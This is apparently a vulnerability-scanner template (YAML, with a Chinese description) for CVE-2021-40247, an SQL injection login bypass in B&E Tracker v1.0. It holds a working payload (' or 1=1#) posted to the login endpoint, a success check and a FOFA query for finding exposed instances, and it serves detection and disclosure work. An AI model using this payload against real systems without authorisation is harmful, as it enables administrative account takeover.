id: CVE-2021-40247

info:
  name: Budget and Expense Tracker System  SQL注入 - 绕过B&E Tracker登录CVE-2021-40247
  author: oretnom23
  severity: critical
  description: |
    B&E Tracker v1.0 存在漏洞在从/expense_budget/dist/js/script.js 应用程序调用的应用程序 /expense_budget/classes/Login.php 中。 
    登录表单中的参数（用户名）没有得到正确保护，没有安全性，也无法逃避恶意负载。 当用户向 MySQL 服务器发送请求时，他可以绕过登录凭据并控制管理帐户。
    fofa-query: "B&E Tracker"
  reference:
    - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/B%26E%20Tracker-by:oretnom23-v1.0

set:
  hosturl: request.url
rules:
  r0:
    request:
      method: POST
      path: /classes/Login.php?f=login
      headers:
        Origin: "{{hosturl}}"
        Referer: "{{hosturl}}/zentao/admin/login.php"
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Te: trailers
      body: |
        username=nu11secu1rty+'+or+1%3D1%23&password=
    expression: response.status == 200 && response.body.bcontains(b'{"status":"success"}') && response.headers["content-type"].contains("text/html")
expression: r0()